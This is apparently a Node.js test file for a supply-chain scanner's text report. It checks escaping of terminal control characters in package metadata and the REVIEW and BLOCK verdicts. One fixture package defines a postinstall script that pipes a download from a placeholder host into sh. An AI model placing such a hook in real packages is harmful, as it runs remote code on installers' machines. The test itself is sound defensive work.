import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { renderTextReport } from '../src/render.js'
import { scanDirectory } from '../src/scan.js'
import { mkdtemp, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

describe('text report rendering', () => {
  it('escapes terminal control characters from package metadata', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-'))
    await writeFile(join(root, 'package.json'), '{"name":"demo\\n\\u001b[31mred","version":"1.0.0"}')

    const rendered = renderTextReport(await scanDirectory(root))
    assert.ok(!rendered.includes('\u001b'))
    assert.match(rendered, /demo\\u000a\\u001b\[31mred/)
  })

  it('turns a review verdict into a concrete next step', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-review-'))
    await writeFile(join(root, 'package.json'), '{"name":"clean-example","version":"1.0.0"}')

    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /Admission verdict: REVIEW/)
    assert.match(rendered, /Next step: Coverage is incomplete; do not treat an empty finding list as an allow decision\./)
  })

  it('tells the user not to install a blocked package', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-block-'))
    await writeFile(join(root, 'package.json'), JSON.stringify({
      name: 'remote-shell',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://example.invalid/install.sh | sh' },
    }))

    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /Admission verdict: BLOCK/)
    assert.match(rendered, /Next step: Do not install this package until the blocking finding is resolved\./)
  })
})
